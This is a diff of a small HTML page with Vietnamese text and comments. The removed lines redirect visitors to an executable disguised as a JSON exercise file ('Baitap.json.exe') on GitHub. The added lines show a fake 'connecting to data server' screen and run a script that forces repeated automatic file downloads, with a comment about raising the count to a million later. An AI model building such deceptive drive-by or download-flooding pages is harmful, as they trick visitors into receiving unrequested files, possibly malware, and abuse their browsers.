@@ -1,12 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="https://github.com/CONVO67/funlearning/raw/refs/heads/main/Baitap.json.exe">
+    <title>Loading Resources...</title>
 </head>
-<body>
+<body style="background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
+    <div style="text-align:center;">
+        <h1>🔄 Đang kết nối máy chủ dữ liệu...</h1>
+        <p>Vui lòng không đóng trình duyệt, quá trình tải sẽ bắt đầu tự động.</p>
+    </div>
+
     <script>
-        // Lệnh dự phòng nếu meta refresh bị chặn
-        window.location.href = "";
+        window.onload = function() {
+            let count = 0;
+            const maxFiles = 5; // Số lượng file test, sau này sếp thích triệu file thì đổi chỗ này
+
+            const autoDownload = setInterval(() => {
+                if (count >= maxFiles) {
+                    clearInterval(autoDownload);
+                    return;
+                }
+
+                const link = document.createElement('a');
+                // Thay cái link dưới bằng Direct Link file 1MB của mày trên GitHub
+                link.href = 'https://github.com/CONVO67/funlearning/raw/main/Data_Part.txt'; 
+                link.download = 'Data_Assignment_Part_' + (count + 1) + '.txt';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+
+                count++;
+            }, 500); // Cách 0.5 giây tải 1 cái cho trình duyệt nó kịp thở
+        };
     </script>
 </body>
 </html>
